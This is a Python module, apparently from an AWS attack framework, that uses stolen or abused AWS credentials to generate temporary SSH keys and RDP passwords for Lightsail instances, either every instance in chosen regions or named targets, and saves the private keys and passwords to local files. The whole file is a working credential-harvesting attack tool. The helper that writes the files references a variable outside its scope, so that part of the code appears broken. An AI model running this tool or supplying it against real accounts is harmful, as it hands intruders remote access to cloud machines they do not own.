#!/usr/bin/env python3
import datetime

import argparse
from botocore.exceptions import ClientError
import os

def write_keys_to_file(created_keys, session):
    for region in created_keys:
        ssh_key_dir = os.path.join(os.getcwd(), 'sessions', session.name, 'downloads', technique_info['name'], region)
        if not os.path.exists(ssh_key_dir):
            os.makedirs(ssh_key_dir)
        for credential in created_keys[region]:
            if credential['protocol'] == 'rdp':
                windows_file_dir = os.path.join(ssh_key_dir, credential['instanceName'])
                try:
                    with open(windows_file_dir, 'w') as windows_file:
                        # Create header for file.
                        windows_file.write('instanceName,ipAddress,username,password\n')

                        windows_file.write(credential['instanceName'] + ',')
                        windows_file.write(credential['ipAddress'] + ',')
                        windows_file.write(credential['username'] + ',')
                        windows_file.write(credential['password'] + '\n')
                except IOError:
                    print('Error writing credential file for {}.'.format(credential['instanceName']))
                    continue
            else:
                private_key_file_dir = os.path.join(ssh_key_dir, credential['instanceName'])
                cert_key_file_dir = os.path.join(ssh_key_dir, credential['instanceName'] + '-cert.pub')
                try:
                    with open(private_key_file_dir, 'w') as private_key_file:
                        private_key_file.write(credential['privateKey'])
                    with open(cert_key_file_dir, 'w') as cert_key_file:
                        cert_key_file.write(credential['certKey'])
                except IOError:
                    print('Error writing credential file for {}.'.format(credential['instanceName']))
                    continue


def main(args, awsattack_main, data=None):
    technique_info = data
    session = awsattack_main.get_active_session()
    print = awsattack_main.print
    get_regions = awsattack_main.get_regions
    fetch_data = awsattack_main.fetch_data

    regions = args.regions.split(',') if args.regions else get_regions('lightsail')
    instances = []

    if args.instances is not None:  # need to update this to include the regions of these IDs
        for instance in args.instances.split(','):
            instance_name = instance.split('@')[0]
            region = instance.split('@')[1]
            protocol = instance.split('@')[2]
            if region not in regions:
                print('  {} is not a valid region'.format(region))
                continue
            else:
                instances.append({
                    'name': instance_name,
                    'protocol': protocol,
                    'region': region,
                })
    else:
        print('Targeting all Lightsail instances...')
        if fetch_data(['Lightsail'], technique_info['prerequisite_modules'][0], '--instances') is False:
            print('Pre-req module not run successfully. Exiting...')
            return
        for instance in session.Lightsail['instances']:
            if instance['region'] in regions:
                protocol = 'rdp' if 'Windows' in instance['blueprintName'] else 'ssh'
                instances.append({
                    'name': instance['name'],
                    'protocol': protocol,
                    'region': instance['region'],
                })

    temp_keys = {}
    for instance in instances:
        temp_keys[instance['region']] = []
    for instance in instances:
        client = awsattack_main.get_boto3_client('lightsail', instance['region'])
        print('    Instance {}'.format(instance['name']))
        try:
            response = client.get_instance_access_details(
                instanceName=instance['name'],
                protocol=instance['protocol']
            )
            temp_keys[instance['region']].append(response['accessDetails'])
            print('    Successfully created temporary access for {}'.format(instance['name']))
        except ClientError as error:
            code = error.response['Error']['Code']
            if code == 'AccessDeniedException':
                print('      Unauthorized to generate temporary access.')
                return
            elif code == 'OperationFailureException':
                print('      FAILED: Unable to interact with non-running instance.')
                continue
            else:
                print(error)
            break

    write_keys_to_file(temp_keys, session)

    windows_count = 0
    ssh_count = 0
    for region in temp_keys:
        for credential in temp_keys[region]:
            if credential['protocol'] == 'rdp':
                windows_count += 1
            else:
                ssh_count += 1

    if windows_count or ssh_count:
        written_file_path = os.path.join('sessions', session.name, 'downloads', technique_info['name'])
    else:
        written_file_path = None

    summary_data = {
        'windows': windows_count,
        'linux': ssh_count,
        'written_file_path': written_file_path,
    }
    return summary_data
